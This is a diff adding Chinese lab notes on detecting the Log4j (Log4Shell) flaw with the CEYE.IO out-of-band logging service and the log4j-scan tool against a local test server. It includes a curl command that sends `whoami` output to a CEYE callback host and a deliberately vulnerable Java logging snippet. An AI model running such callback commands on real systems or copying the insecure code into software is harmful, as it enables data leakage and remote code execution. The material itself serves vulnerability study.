@@ -406,6 +406,114 @@
 
     [CEYE平台的使用max](https://www.cnblogs.com/zhaijiahui/p/9160913.html)
 
+  注册后可以看到，在用户详情页`http://ceye.io/profile`下图所示,可以看到自己的域名标识符`identifier`。对于每个用户，都有自己唯一的域名标识符，如：abcdef.ceye.io。所有来自于abcdef.ceye.io或*.abcdef.ceye.io的DNS查询和HTTP请求都会被记录。通过查看这些记录信息，可以确认并改进自己的漏洞研究方案。
+
+  ![ceye_id](pic/ceye_id.png)
+
+  DNS查询可以以多种不同的方式进行解析。CEYE.IO平台提供了一台DNS Server来解析域名。它的 nameserver address 被设置为自己的服务器IP，因此所有关于ceye.io 的域名的DNS查询最终都会被发送到CEYE的DNS服务器。
+
+  在终端中使用nslookup
+
+  ![nslookup](pic/nslookup.png)
+ 
+  可以在浏览器端看到记录
+  ![nslook](pic/nslook.png)
+
+
+  >curl -X POST http://ip.port.abcdef.ceye.io/`whoami`?p=http -d data=http
+
+  ![ceye](pic/ceye_curl_post.png)
+
+  在后台，CEYE.IO平台将记录客户端请求的URL，远程IP地址，Http Method，Data，User Agent，Content Type等信息。
+
+  ![web_http](pic/web_http.png)
+
+--------------
+　自动化检测方式
+
+  >git clone https://github.com/fullhunt/log4j-scan
+
+  ![log4j-scan](pic/log4j-scan.png)
+
+  >cd log4j-scan
+
+  >sudo apt update && sudo apt install -y python3-pip
+
+  >pip3 install -r requirements.txt
+  
+  ![pip_install_requirements](pic/pip_install_requirements.png)
+
+  根据缺陷代码，可以得知接受payload字段，但是当前扫描程序里面没有payload字段。
+
+  ```
+    public String hello(String payload) {
+    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
+    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+ 
+    /* 以下为缺陷代码片段开始 */
+    logger.error("{}", payload);
+    logger.info("{}", payload);
+    logger.info(payload);
+
+  ```
+
+  修改`log4j-scan.py`
+
+  编辑
+
+  ```
+  post_data_parameters = ["username", "user", "email", "email_address", "password"]
+  ```
+
+  改为
+
+  ```
+  post_data_parameters = ["username", "user", "email", "email_address", "password", "payload"]
+  ```
+  
+  用到了interact工具
+
+  >python3 log4j-scan.py --request-type post -u http://192.168.56.108:11779/hello
+  
+  报错：
+  ```
+  requests.exceptions.ConnectionError: HTTPSConnectionPool(host='interact.sh', port=443): Max retries exceeded with url: /register (Caused by NewConnectionError('<urllib3.connection.HTTPSConnection object at 0x7f6c45474af0>: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution'))
+
+  ```
+
+  通过chatAI查询具体的解决方式
+  ```
+  根据您提供的错误信息，报错表明在与 `interact.sh` 建立 HTTPS 连接时出现了问题，无法解析主机名 `interact.sh`。
+
+  这个错误通常是由于 DNS 解析失败导致的，也就是无法将域名解析为 IP 地址。可能的原因和解决方法如下：
+
+  1. DNS 解析问题：您的计算机可能无法正确解析域名 `interact.sh`。您可以尝试使用以下命令检查 DNS 设置：
+
+  > cat /etc/resolv.conf
+
+
+  确保其中的 DNS 服务器地址正确配置。您可以尝试修改 DNS 设置为其他可靠的 DNS 服务器，如 Google 的公共 DNS 服务器 `8.8.8.8` 和 `8.8.4.4`，编辑 `/etc/resolv.conf` 文件并更新 DNS 地址。
+
+  2. 网络连接问题：请确保您的网络连接正常并且可以访问互联网。您可以尝试使用 `ping` 命令检查网络连接的连通性：
+
+  > ping interact.sh
+  
+  如果出现无法解析的错误，请参考之前提到的网络连接问题解决方案。
+
+  3. 防火墙或网络安全设置：某些防火墙、安全工具或网络设置可能阻止您的计算机进行 DNS 查询或建立 HTTPS 连接，请确保防火墙或安全设置允许此类通信。您可以尝试禁用防火墙或临时关闭某些安全工具，并再次尝试执行命令。
+
+  4. 临时问题：有时，特定的网络故障或暂时的服务器问题可能导致解析失败。如果这是一个临时问题，您可以稍后再试，看是否问题得到解决。
+
+  如果您尝试了上述解决方案仍然无法解决问题，请考虑联系网络管理员或技术支持人员寻求进一步的帮助。他们可以对您的网络设置和环境有更深入的了解，并提供特定于您情况的解决方案。
+  ```
+  尝试后发现无法解析域名 interact.sh。这进一步确认了 DNS 解析的问题。
+
+  检查DNS设置，发现没有报错，还是没有解决相关网站的登录问题。
+
+
+
+
+
 
 
   
@@ -415,3 +523,5 @@
 
 1. 漏洞利用监测
 2. 漏洞利用防御与加固
+
+
